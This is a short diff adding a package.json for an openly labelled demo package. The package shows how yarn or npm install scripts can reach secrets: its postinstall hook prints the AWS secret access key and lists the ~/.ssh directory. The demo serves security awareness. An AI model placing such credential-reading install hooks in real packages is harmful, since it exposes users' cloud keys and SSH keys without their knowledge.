@@ -1,0 +1,8 @@
+{
+	"name": "yarn-contained-token-extractor",
+	"description": "A demo application to show how yarn/npm install can collect environment variables and SSH keys",
+	"version": "0.0.1",
+	"scripts": {
+		"postinstall": "echo $AWS_SECRET_ACCESS_KEY && ls -al ~/.ssh"
+	}
+}
